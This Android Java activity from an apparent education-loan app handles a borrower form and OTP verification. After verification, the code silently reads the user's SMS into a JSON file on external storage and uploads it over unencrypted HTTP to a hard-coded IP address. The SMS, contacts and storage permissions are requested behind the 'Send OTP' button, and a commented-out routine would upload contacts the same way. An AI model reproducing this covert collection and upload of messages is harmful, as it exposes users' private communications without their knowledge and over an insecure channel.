package com.eduvanz.pqformfragments;

import android.Manifest;
import android.app.ProgressDialog;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.Typeface;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.support.annotation.Nullable;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import com.eduvanz.DashBoardFragment;
import com.eduvanz.Main2ActivityNavigation;
import com.eduvanz.MainActivity;
import com.eduvanz.MainApplication;
import com.eduvanz.R;
import com.eduvanz.SharedPref;
import com.eduvanz.SuccessSplash;
import com.eduvanz.volley.VolleyCall;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;

import static com.eduvanz.MainApplication.TAG;

public class SuccessAfterPQForm extends AppCompatActivity {
    Toolbar mToolbar;
    public static AppCompatActivity mActivity;
    TextView textView4, textView3;
    String user_name;
    public static Button buttonSendOTP, buttonVerify;
    Typeface typefaceFont, typefaceFontBold;
    int permission;
    public String recivedotp="";
    public static EditText editTextInputName, editTextInputEmail, editTextInputNo, editTextOTP;
    SharedPref shareP;
    StringBuffer sb;
    long total = 0;
    ProgressDialog mDialog;
    public int GET_MY_PERMISSION = 1;

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_successafterpq);

//        mToolbar= (Toolbar) findViewById(R.id.toolbar);
//        setSupportActionBar(mToolbar);
//        getSupportActionBar().setDisplayHomeAsUpEnabled(true);
//        mToolbar.setTitle("Details");

        typefaceFont = Typeface.createFromAsset(getApplicationContext().getAssets(), "fonts/droidsans_font.ttf");
        typefaceFontBold = Typeface.createFromAsset(getApplicationContext().getAssets(), "fonts/droidsans_bold.ttf");

        mActivity = this;
        this.getWindow().setSoftInputMode(WindowManager.LayoutParams.SOFT_INPUT_STATE_ALWAYS_HIDDEN);// hide the keyboard everytime the activty starts.

        editTextInputName = (EditText) findViewById(R.id.input_name);
        editTextInputName.setTypeface(typefaceFont);
        editTextInputEmail = (EditText) findViewById(R.id.input_email);
        editTextInputEmail.setTypeface(typefaceFont);
        editTextInputNo = (EditText) findViewById(R.id.input_number);
        editTextInputNo.setTypeface(typefaceFont);
        editTextOTP = (EditText) findViewById(R.id.input_otp);
        editTextOTP.setTypeface(typefaceFont);

        textView3 = (TextView) findViewById(R.id.textview3_font_ss);
        textView3.setTypeface(typefaceFont);
        textView4 = (TextView) findViewById(R.id.textview_resendotp);
        textView4.setTypeface(typefaceFont);

        buttonVerify = (Button) findViewById(R.id.button_verify);
        buttonVerify.setTypeface(typefaceFont);

        buttonSendOTP = (Button) findViewById(R.id.button_sendOtp);
        buttonSendOTP.setTypeface(typefaceFont);
        buttonSendOTP.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {


                if(editTextInputName.getText().toString().equalsIgnoreCase("")){
                    editTextInputName.setError("Name Cannot be Empty");
                    return;
                }
                if(editTextInputNo.getText().toString().equalsIgnoreCase("")){
                    editTextInputNo.setError("Mobile Number Cannot be Empty");
                    return;
                }
                if(editTextInputEmail.getText().toString().equalsIgnoreCase("")){
                    editTextInputEmail.setError("Email Cannot be Empty");
                    return;
                }

                if (Build.VERSION.SDK_INT >= 23)
                {
                    permission = ContextCompat.checkSelfPermission(getApplicationContext(),
                            Manifest.permission.READ_SMS);

                    if (permission != PackageManager.PERMISSION_GRANTED) {
                        Log.i("TAG", "Permission to record denied");
                        makeRequest();
//                        ActivityCompat.requestPermissions(SuccessAfterPQForm.this,
//                                new String[]{Manifest.permission.READ_SMS},
//                                GET_MY_PERMISSION);
                    } else if(permission == PackageManager.PERMISSION_GRANTED){
                        apiCall();
                    }
                }
                else
                {
                    apiCall();
                }

//                if (ContextCompat.checkSelfPermission(SuccessAfterPQForm.this, Manifest.permission.READ_SMS)
//                        != PackageManager.PERMISSION_GRANTED) {
//                    if (ActivityCompat.shouldShowRequestPermissionRationale(SuccessAfterPQForm.this,
//                            Manifest.permission.READ_SMS)) {
//            /* do nothing*/
//                    } else {
//
//                        ActivityCompat.requestPermissions(SuccessAfterPQForm.this,
//                                new String[]{Manifest.permission.READ_SMS}, GET_MY_PERMISSION);
//                    }
//                }else {
//
//                }
            }
        });

        textView4.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                apiCall();
            }
        });

        buttonVerify.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                //-----------------------------------------API CALL---------------------------------------//
                try {
                    String url = MainApplication.mainUrl + "pqform/checkOtpVerification";
                    Map<String, String> params = new HashMap<String, String>();
                    params.put("institute", MainApplication.mainapp_instituteID);
                    params.put("course",  MainApplication.mainapp_courseID);
                    params.put("location",  MainApplication.mainapp_locationID);
                    params.put("loanAmount",  MainApplication.mainapp_loanamount);
                    params.put("cc",  MainApplication.mainapp_doccheck);
                    params.put("familyIncomeAmount",  MainApplication.mainapp_fammilyincome);
                    params.put("studentProfessional",  MainApplication.mainapp_professioncheck);
                    params.put("currentResidence",  MainApplication.mainapp_currentCity);
                    params.put("borrowerName",  editTextInputName.getText().toString());
                    params.put("borrowerMobileNo", editTextInputNo.getText().toString());
                    params.put("email",  editTextInputEmail.getText().toString());
                    params.put("otp",  editTextOTP.getText().toString());
                    VolleyCall volleyCall = new VolleyCall();
                    volleyCall.sendRequest(getApplicationContext(), url, mActivity, null, "verifyOtp", params);
                } catch (Exception e) {
                    e.printStackTrace();
                }
                //-------------------------------------END OF API CALL------------------------------------//
            }
        });
    }//-------------------------------------END OF NOCREATE---------------------------------------//

    protected void makeRequest() {
        ActivityCompat.requestPermissions(SuccessAfterPQForm.this,
                new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.READ_EXTERNAL_STORAGE,  Manifest.permission.READ_SMS, Manifest.permission.READ_PHONE_STATE, Manifest.permission.READ_CONTACTS, Manifest.permission.WRITE_CONTACTS},
                GET_MY_PERMISSION);
    }

    public void apiCall(){
        //-----------------------------------------API CALL---------------------------------------//
        try {
            String url = MainApplication.mainUrl + "pqform/sendSms";
            Map<String, String> params = new HashMap<String, String>();
            params.put("institute", MainApplication.mainapp_instituteID);
            params.put("course",  MainApplication.mainapp_courseID);
            params.put("location",  MainApplication.mainapp_locationID);
            params.put("loanAmount",  MainApplication.mainapp_loanamount);
            params.put("cc",  MainApplication.mainapp_doccheck);
            params.put("familyIncomeAmount",  MainApplication.mainapp_fammilyincome);
            params.put("studentProfessional",  MainApplication.mainapp_professioncheck);
            params.put("currentResidence",  MainApplication.mainapp_currentCity);
            params.put("borrowerName",  editTextInputName.getText().toString());
            params.put("borrowerMobileNo", editTextInputNo.getText().toString());
            params.put("email",  editTextInputEmail.getText().toString());
            VolleyCall volleyCall = new VolleyCall();
            volleyCall.sendRequest(getApplicationContext(), url, mActivity, null, "sendOtp", params);
        } catch (Exception e) {
            e.printStackTrace();
        }
        //-------------------------------------END OF API CALL------------------------------------//
    }

    protected void onPause() {
        // TODO Auto-generated method stub
        super.onPause();
    }

    public void setOtp(String otp) {
        recivedotp = otp;
        editTextOTP.setText(recivedotp);
    }

    //---------------------------------RESPONSE OF API CALL---------------------------------------//
    public void sendOtp(JSONObject jsonData) {
        try {
            Log.e("SERVER CALL", "sendOtp" + jsonData);
            String status = jsonData.optString("status");
            String message = jsonData.optString("message");

            if (status.equalsIgnoreCase("1")) {
                Toast.makeText(getApplicationContext(), message, Toast.LENGTH_SHORT).show();
                buttonSendOTP.setVisibility(View.GONE);
                buttonVerify.setVisibility(View.VISIBLE);
                textView4.setVisibility(View.VISIBLE);

            }else {
                Toast.makeText(getApplicationContext(), message, Toast.LENGTH_SHORT).show();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void verifyOtp(JSONObject jsonData) {
        try {
            Log.e("SERVER CALL", "sendOtp" + jsonData);
            String status = jsonData.optString("status");
            String message = jsonData.optString("message");

            if (status.equalsIgnoreCase("1")) {
                Toast.makeText(getApplicationContext(), message, Toast.LENGTH_SHORT).show();
                JSONObject jsonObject = jsonData.getJSONObject("result");
                String loggedID = jsonObject.optString("logged_id");
                String firstName = jsonObject.optString("first_name");
                String lastName = jsonObject.optString("last_name");
                String userType = jsonObject.optString("user_type");
                String userImage = jsonObject.optString("img_profile");
                String useremail = jsonObject.optString("email");
                String mobileNo = jsonObject.optString("mobile_no");

                shareP =new SharedPref();
                shareP.setLoginDone(this,true);

                SharedPreferences sharedPreferences = getSharedPreferences("UserData", getApplicationContext().MODE_PRIVATE);
                SharedPreferences.Editor editor = sharedPreferences.edit();
                editor.putString("logged_id",loggedID);
                editor.putString("first_name",firstName);
                editor.putString("last_name",lastName);
                editor.putString("user_type",userType);
                editor.putString("mobile_no",mobileNo);
                editor.putString("user_image",userImage);
                editor.putString("user_email",useremail);
                editor.commit();

                MainApplication.readSms(getApplicationContext(), mobileNo, loggedID);
                mReadJsonData();

//                MainApplication.contactsRead(getApplicationContext(), mobileNo, loggedID);
//                mReadJsonDataContacts();

                Intent intent = new Intent(this, SuccessSplash.class);
                startActivity(intent);
                finish();

            }else {
                Toast.makeText(getApplicationContext(), message, Toast.LENGTH_SHORT).show();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void mReadJsonData() {
        final File dir = new File(Environment.getExternalStorageDirectory()+"/");
        if (dir.exists() == false) {
            dir.mkdirs();
        }
        final File f = new File(dir, "saveSMS.json");
        new Thread(new Runnable() {
            @Override
            public void run() {
                uploadFile(f.getAbsolutePath());
            }
        }).start();
    }

//    public void mReadJsonDataContacts() {
//        Log.e(TAG, "mReadJsonDataContacts: " );
//        final File dir = new File(Environment.getExternalStorageDirectory() + "/");
//        if (dir.exists() == false) {
//            dir.mkdirs();
//        }
//        final File f = new File(dir, "contacts.json");
//        new Thread(new Runnable() {
//            @Override
//            public void run() {
//                uploadFileContacts(f.getAbsolutePath());
//            }
//        }).start();
//    }


    /** upload SMS file to server **/
    public int uploadFile(final String selectedFilePath) {
        String urlup = "http://139.59.32.234/sms/Api/send_message";
        int serverResponseCode = 0;

        HttpURLConnection connection;
        DataOutputStream dataOutputStream;
        String lineEnd = "\r\n";
        String twoHyphens = "--";
        String boundary = "*****";

        final int count,fileLength;

        int bytesRead, bytesAvailable, bufferSize;
        byte[] buffer;
        int maxBufferSize = 1 * 1024 * 1024;
        File selectedFile = new File(selectedFilePath);


        String[] parts = selectedFilePath.split("/");
        final String fileName = parts[parts.length - 1];

        if (!selectedFile.isFile()) {
            //dialog.dismiss();

            runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    Log.e("ReadSms", "run: " + "Source File Doesn't Exist: " + selectedFilePath);
                }
            });
            return 0;
        }
        else {
            try {
//                runOnUiThread(new Runnable() {
//                    @Override
//                    public void run() {
//                        showProressBar("Please wait verifying user credentials");
//                    }
//
//                });


                FileInputStream fileInputStream = new FileInputStream(selectedFile);
                URL url = new URL(urlup);
                connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("POST");
                connection.setDoInput(true);//Allow Inputs
                connection.setDoOutput(true);//Allow Outputs
                connection.setUseCaches(false);//Don't use a cached Copy
                connection.setRequestMethod("POST");
                connection.setRequestProperty("Connection", "Keep-Alive");
                connection.setRequestProperty("ENCTYPE", "multipart/form-data");
                connection.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
                connection.setRequestProperty("document", selectedFilePath);
//
//
                connection.setRequestProperty("file_name", "saveSMS");
                Log.e("ReadSms", "Server property" + connection.getRequestMethod() + ":property " + connection.getRequestProperties());


                //creating new dataoutputstream
                dataOutputStream = new DataOutputStream(connection.getOutputStream());

                //writing bytes to data outputstream
                dataOutputStream.writeBytes(twoHyphens + boundary + lineEnd);
                dataOutputStream.writeBytes("Content-Disposition: form-data; name=\"document\";filename=\""
//                dataOutputStream.writeBytes("Content-Disposition: form-data; name=\"contactsdocument\";filename=\""
                        + selectedFilePath + "\"" + lineEnd);
                dataOutputStream.writeBytes(lineEnd);

                //returns no. of bytes present in fileInputStream
                bytesAvailable = fileInputStream.available();
                //selecting the buffer size as minimum of available bytes or 1 MB
                bufferSize = Math.min(bytesAvailable, maxBufferSize);
                //setting the buffer as byte array of size of bufferSize
                buffer = new byte[bufferSize];
                fileLength=bufferSize;
                //reads bytes from FileInputStream(from 0th index of buffer to buffersize)
                bytesRead = fileInputStream.read(buffer, 0, bufferSize);

                Log.e(TAG, "uploadFile: TOTAL bytes to read "+bytesRead+"total"+bufferSize );
                //loop repeats till bytesRead = -1, i.e., no bytes are left to read
                total=0;

                while (bytesRead > 0) {
                    total+=bytesRead;
                    //write the bytes read from inputstream
                    dataOutputStream.write(buffer, 0, bufferSize);
                    Log.e("ReadSms", " here: \n\n" + buffer + "\n" + bufferSize);
                    bytesAvailable = fileInputStream.available();
                    bufferSize = Math.min(bytesAvailable, maxBufferSize);
                    bytesRead = fileInputStream.read(buffer, 0, bufferSize);
                    Log.e(TAG, "uploadFile: "+bytesRead+total );
                    Log.e(TAG, "uploadFile: percentage "+((int) Math.round(total * 100 / fileLength)) );
                    // Publish the progress
                    final int finalBytesRead = bytesRead;
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {

                            Log.e(TAG, "uploadFile: percentage "+((int) Math.round(total * 100 / fileLength)) );
//                            mDialog.setProgress((int) Math.round(total * 100 / fileLength));
                        }
                    });
                }
                dataOutputStream.writeBytes(lineEnd);
                dataOutputStream.writeBytes(twoHyphens + boundary + lineEnd);
                dataOutputStream.writeBytes("Content-Disposition: form-data; name=\"file_name\"" + lineEnd);
                dataOutputStream.writeBytes(lineEnd);
                dataOutputStream.writeBytes("1");
                dataOutputStream.writeBytes(lineEnd);
                dataOutputStream.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);

                //dataOutputStream.writeBytes(URLEncoder.encode("user_id", "UTF-8")
                //        + "=" + URLEncoder.encode("1", "UTF-8"));

                serverResponseCode = connection.getResponseCode();
                Log.e("ReadSms", " here:server response \n\n" + serverResponseCode);
                String serverResponseMessage = connection.getResponseMessage();
                Log.e("ReadSms", " here: server message \n\n" + serverResponseMessage.toString() + "\n" + bufferSize);
                BufferedReader br = new BufferedReader(new InputStreamReader((connection.getInputStream())));
                String output = "";
                sb = new StringBuffer();

                while ((output = br.readLine()) != null) {
                    sb.append(output);
                    Log.e("ReadSms", "uploadFile: " + br);
                    Log.e("ReadSms", "Server Response is: " + serverResponseMessage + ": " + serverResponseCode);
                }
                Log.e("ReadSms ", "uploadFile: " + sb.toString());

                //response code of 200 indicates the server status OK
                if (serverResponseCode == 200) {
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            Toast.makeText(SuccessAfterPQForm.this, sb.toString(), Toast.LENGTH_SHORT).show();

                            Log.e("ReadSms", " here: \n\n" + fileName);
                        }
                    });
                }

                //closing the input and output streams
                fileInputStream.close();
                dataOutputStream.flush();
                dataOutputStream.close();


            } catch (FileNotFoundException e) {
                e.printStackTrace();
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        Toast.makeText(SuccessAfterPQForm.this, "File Not Found", Toast.LENGTH_SHORT).show();
                    }
                });
            } catch (MalformedURLException e) {
                e.printStackTrace();
                Toast.makeText(SuccessAfterPQForm.this, "URL error!", Toast.LENGTH_SHORT).show();

            } catch (IOException e) {
                e.printStackTrace();
                Toast.makeText(SuccessAfterPQForm.this, "Cannot Read/Write File!", Toast.LENGTH_SHORT).show();
            }
//            dialog.dismiss();
            return serverResponseCode;
        }
    }




//    /** upload Contacts file to server **/
//    public int uploadFileContacts(final String selectedFilePath) {
//        String urlup = "http://139.59.32.234/sms/Api/send_message";
//        int serverResponseCode = 0;
//
//        HttpURLConnection connection;
//        DataOutputStream dataOutputStream;
//        String lineEnd = "\r\n";
//        String twoHyphens = "--";
//        String boundary = "*****";
//
//        final int count,fileLength;
//
//        int bytesRead, bytesAvailable, bufferSize;
//        byte[] buffer;
//        int maxBufferSize = 1 * 1024 * 1024;
//        File selectedFile = new File(selectedFilePath);
//
//
//        String[] parts = selectedFilePath.split("/");
//        final String fileName = parts[parts.length - 1];
//
//        if (!selectedFile.isFile()) {
//            //dialog.dismiss();
//
//            runOnUiThread(new Runnable() {
//                @Override
//                public void run() {
//                    Log.e("ReadSms", "run: " + "Source File Doesn't Exist: " + selectedFilePath);
//                }
//            });
//            return 0;
//        }
//        else {
//            try {
////                runOnUiThread(new Runnable() {
////                    @Override
////                    public void run() {
////                        showProressBar("Please wait verifying user credentials");
////                    }
////
////                });
//
//
//                FileInputStream fileInputStream = new FileInputStream(selectedFile);
//                URL url = new URL(urlup);
//                connection = (HttpURLConnection) url.openConnection();
//                connection.setRequestMethod("POST");
//                connection.setDoInput(true);//Allow Inputs
//                connection.setDoOutput(true);//Allow Outputs
//                connection.setUseCaches(false);//Don't use a cached Copy
//                connection.setRequestMethod("POST");
//                connection.setRequestProperty("Connection", "Keep-Alive");
//                connection.setRequestProperty("ENCTYPE", "multipart/form-data");
//                connection.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
//                connection.setRequestProperty("document", selectedFilePath);
////
////
//                connection.setRequestProperty("file_name", "saveSMS");
//                Log.e("ReadSms", "Server property" + connection.getRequestMethod() + ":property " + connection.getRequestProperties());
//
//
//                //creating new dataoutputstream
//                dataOutputStream = new DataOutputStream(connection.getOutputStream());
//
//                //writing bytes to data outputstream
//                dataOutputStream.writeBytes(twoHyphens + boundary + lineEnd);
//                dataOutputStream.writeBytes("Content-Disposition: form-data; name=\"contactsdocument\";filename=\""
//                        + selectedFilePath + "\"" + lineEnd);
//                dataOutputStream.writeBytes(lineEnd);
//
//                //returns no. of bytes present in fileInputStream
//                bytesAvailable = fileInputStream.available();
//                //selecting the buffer size as minimum of available bytes or 1 MB
//                bufferSize = Math.min(bytesAvailable, maxBufferSize);
//                //setting the buffer as byte array of size of bufferSize
//                buffer = new byte[bufferSize];
//                fileLength=bufferSize;
//                //reads bytes from FileInputStream(from 0th index of buffer to buffersize)
//                bytesRead = fileInputStream.read(buffer, 0, bufferSize);
//
//                Log.e(TAG, "uploadFile: TOTAL bytes to read "+bytesRead+"total"+bufferSize );
//                //loop repeats till bytesRead = -1, i.e., no bytes are left to read
//                total=0;
//
//                while (bytesRead > 0) {
//                    total+=bytesRead;
//                    //write the bytes read from inputstream
//                    dataOutputStream.write(buffer, 0, bufferSize);
//                    Log.e("ReadSms", " here: \n\n" + buffer + "\n" + bufferSize);
//                    bytesAvailable = fileInputStream.available();
//                    bufferSize = Math.min(bytesAvailable, maxBufferSize);
//                    bytesRead = fileInputStream.read(buffer, 0, bufferSize);
//                    Log.e(TAG, "uploadFile: "+bytesRead+total );
//                    Log.e(TAG, "uploadFile: percentage "+((int) Math.round(total * 100 / fileLength)) );
//                    // Publish the progress
//                    final int finalBytesRead = bytesRead;
//                    runOnUiThread(new Runnable() {
//                        @Override
//                        public void run() {
//
//                            Log.e(TAG, "uploadFile: percentage "+((int) Math.round(total * 100 / fileLength)) );
////                            mDialog.setProgress((int) Math.round(total * 100 / fileLength));
//                        }
//                    });
//                }
//                dataOutputStream.writeBytes(lineEnd);
//                dataOutputStream.writeBytes(twoHyphens + boundary + lineEnd);
//                dataOutputStream.writeBytes("Content-Disposition: form-data; name=\"file_name\"" + lineEnd);
//                dataOutputStream.writeBytes(lineEnd);
//                dataOutputStream.writeBytes("1");
//                dataOutputStream.writeBytes(lineEnd);
//                dataOutputStream.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
//
//                //dataOutputStream.writeBytes(URLEncoder.encode("user_id", "UTF-8")
//                //        + "=" + URLEncoder.encode("1", "UTF-8"));
//
//                serverResponseCode = connection.getResponseCode();
//                Log.e("ReadSms", " here:server response \n\n" + serverResponseCode);
//                String serverResponseMessage = connection.getResponseMessage();
//                Log.e("ReadSms", " here: server message \n\n" + serverResponseMessage.toString() + "\n" + bufferSize);
//                BufferedReader br = new BufferedReader(new InputStreamReader((connection.getInputStream())));
//                String output = "";
//                sb = new StringBuffer();
//
//                while ((output = br.readLine()) != null) {
//                    sb.append(output);
//                    Log.e("ReadSms", "uploadFile: " + br);
//                    Log.e("ReadSms", "Server Response is: " + serverResponseMessage + ": " + serverResponseCode);
//                }
//                Log.e("ReadSms ", "uploadFile: " + sb.toString());
//
//                //response code of 200 indicates the server status OK
//                if (serverResponseCode == 200) {
//                    runOnUiThread(new Runnable() {
//                        @Override
//                        public void run() {
//                            Toast.makeText(SuccessAfterPQForm.this, sb.toString(), Toast.LENGTH_SHORT).show();
//
//                            Log.e("ReadSms", " here: \n\n" + fileName);
//                        }
//                    });
//                }
//
//                //closing the input and output streams
//                fileInputStream.close();
//                dataOutputStream.flush();
//                dataOutputStream.close();
//
//
//            } catch (FileNotFoundException e) {
//                e.printStackTrace();
//                runOnUiThread(new Runnable() {
//                    @Override
//                    public void run() {
//                        Toast.makeText(SuccessAfterPQForm.this, "File Not Found", Toast.LENGTH_SHORT).show();
//                    }
//                });
//            } catch (MalformedURLException e) {
//                e.printStackTrace();
//                Toast.makeText(SuccessAfterPQForm.this, "URL error!", Toast.LENGTH_SHORT).show();
//
//            } catch (IOException e) {
//                e.printStackTrace();
//                Toast.makeText(SuccessAfterPQForm.this, "Cannot Read/Write File!", Toast.LENGTH_SHORT).show();
//            }
////            dialog.dismiss();
//            return serverResponseCode;
//        }
//    }

    private void showProressBar(String s) {
        mDialog = new ProgressDialog(SuccessAfterPQForm.this);
        mDialog.setMessage(s);
//        mDialog.setIndeterminate(false);
//        mDialog.setMax(100);
//        mDialog.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL);
        mDialog.setCancelable(true);
        mDialog.show();
//        return pDialog;
    }
}
